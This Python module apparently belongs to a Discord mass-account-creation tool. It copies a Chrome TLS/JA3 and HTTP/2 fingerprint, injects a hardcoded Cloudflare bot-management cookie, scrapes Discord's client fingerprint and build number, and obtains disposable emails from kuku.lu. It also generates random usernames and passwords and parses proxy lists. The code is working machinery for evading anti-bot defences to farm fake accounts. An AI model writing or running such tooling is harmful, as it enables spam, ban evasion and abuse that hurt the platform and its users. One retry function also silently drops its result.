import requests, re, tls_client, string, random
from modules.console import printl


def check_version():
    try:
        printl("info", "Checking version...")
        # githubからデータを取得
        get_version = requests.get(
            "https://raw.githubusercontent.com/NyaShinn1204/Discord-Account-Creator/dev-v0.0.1/version"
        ).text.split("\n")[0]
        now_version = open("version", "r").read().splitlines()[0]
        # デバイスとオンライン上と照合
        if now_version == get_version:
            printl("info", f"Using Latest Version: {now_version}")
        else:
            printl("error", f"You are using an older version, now version: {now_version}")
            printl("error", f"Latest Version: {get_version}")
    except:
        printl("error", "Failed to Check Version")


def get_session():
    session = tls_client.Session(
        client_identifier=f"chrome_120",
        random_tls_extension_order=True,
        ja3_string="771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,10-23-27-43-13-65281-16-5-45-18-0-11-35-17513-51-21-41,29-23-24,0",
        h2_settings={"HEADER_TABLE_SIZE": 65536,"MAX_CONCURRENT_STREAMS": 1000,"INITIAL_WINDOW_SIZE": 6291456,"MAX_HEADER_LIST_SIZE": 262144,},
        h2_settings_order=["HEADER_TABLE_SIZE","MAX_CONCURRENT_STREAMS","INITIAL_WINDOW_SIZE","MAX_HEADER_LIST_SIZE",],
        supported_signature_algorithms=["ECDSAWithP256AndSHA256","PSSWithSHA256","PKCS1WithSHA256","ECDSAWithP384AndSHA384","PSSWithSHA384","PKCS1WithSHA384","PSSWithSHA512","PKCS1WithSHA512",],
        supported_versions=["GREASE", "1.3", "1.2"],
        key_share_curves=["GREASE", "X25519"],
        cert_compression_algo="brotli",
        pseudo_header_order=[":method", ":authority", ":scheme", ":path"],
        connection_flow=15663105,
        header_order=["accept", "user-agent", "accept-encoding", "accept-language"],
    )
    return session

def get_cookies(session):
    try:
        cookies = dict(session.get("https://discord.com/api/v9/experiments").cookies)
        cookies["__cf_bm"]="0duPxpWahXQbsel5Mm.XDFj_eHeCKkMo.T6tkBzbIFU-1679837601-0-AbkAwOxGrGl9ZGuOeBGIq4Z+ss0Ob5thYOQuCcKzKPD2xvy4lrAxEuRAF1Kopx5muqAEh2kLBLuED6s8P0iUxfPo+IeQId4AS3ZX76SNC5F59QowBDtRNPCHYLR6+2bBFA=="
        cookies["locale"]="en-US"
        printl("info", f"Got cookies {len(cookies)}")
        return cookies
    except:
        printl("error", "Failed to get cookies, unknown error.")
        return

def get_fingerprint(session):
    headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://discord.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-GPC': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36 Edg/114.0.1823.51',
        }
    try:
        response = session.get('https://discord.com/api/v9/experiments', headers=headers)
        if response.status_code == 200:
            data = response.json()
            fingerprint = data["fingerprint"]
            printl("info", f"Got fingerprint {fingerprint}")
            return fingerprint
        else:
            return None
    except:
        printl("error", "Failed to get fingerprint, unknown error.")
        return

def get_buildnum(session):
    text = session.get("https://discord.com/login").text 
    script_url = 'https://discord.com/assets/' + re.compile(r'\d+\.\w+\.js|sentry\.\w+\.js').findall(text)[-1]
    text = session.get(script_url).text
    index = text.find("buildNumber") + 26
    build_num = int(text[index:index + 6])
    return build_num

def get_username():
    uncheck_username = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(15)) 
    try:
        response = requests.post("https://discord.com/api/v9/unique-username/username-attempt-unauthed", json={"username": uncheck_username})
        if response.status_code == 429:
            printl("error", "Rate limitation has now occurred on the request to check user name. Skip check.")
            return uncheck_username
        if response.json()["taken"] == False:
            printl("info", f"Got Username {uncheck_username}")
            return uncheck_username
        else:
            printl("error", "Regenerate the user name since it already exists.")
            get_username()
    except:
        printl("error", "Failed to get username, unknown error.")
        return

def get_globalname(): ## Sorry Skid 
    try:
        names = requests.post(
            "https://www.spinxo.com/services/NameService.asmx/GetNames",
            json={"snr":{"category":0,"UserName":"","Hobbies":"playing","ThingsILike":"","Numbers": "1,2,6,9,,,!,$,|","WhatAreYouLike":"gaming","Words":"","Stub":"username","LanguageCode":"en","NamesLanguageID":"45","Rhyming":False,"OneWord":True,"UseExactWords":False,"ScreenNameStyleString":"Any","GenderAny":True,"GenderMale":False,"GenderFemale":False}}
        )
        if names.status_code == 200:
            name = random.choice(names.json()["d"]["Names"])
            printl("info", f"Got Global Username {name}")
            return name
    except:
        printl("error", "Failed to get global name, unknown error.")
        return

def get_email(token, sessionhash):
    def remove_string(string:str, remove):
        if type(remove) == str:
            string = string.replace(remove, '')
        elif type(remove) == list:
            for remove_string in remove:
                string = string.replace(remove_string, '')
        return string
    poipoi_session = requests.session()
    poipoi_session.cookies.set('cookie_csrf_token', token)
    poipoi_session.cookies.set('cookie_sessionhash', sessionhash)
    response = poipoi_session.get(f'https://m.kuku.lu/index.php?action=addMailAddrByManual&by_system=1&csrf_token_check={token}&newdomain=cocoro.uk&newuser=')
    email = remove_string(response.text, 'OK:')
    return email

def get_password():
    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(15, 20))) 

def format_proxy(data):
    # match_typeの初期設定
    match_type = None
    # ip:portのパターン
    ip_port_pattern = re.compile(r"(\d+\.\d+\.\d+\.\d+):(\d+)")
    # username:password@ip:portのパターン
    user_pass_ip_port_pattern = re.compile(r"(\w+):(\w+)@(\d+\.\d+\.\d+\.\d+):(\w+)")
    # ip:portのパターンに一致するか確認
    match1 = ip_port_pattern.match(data)
    if match1:
        match_type = 1
        ip, port = match1.groups()
        return match_type, ip, port
    # username:password@ip:portのパターンに一致するか確認
    match2 = user_pass_ip_port_pattern.match(data)
    if match2:
        match_type = 2
        username, password, ip, port = match2.groups()
        return match_type, username, password, ip, port
    print("Unknown Data types.")
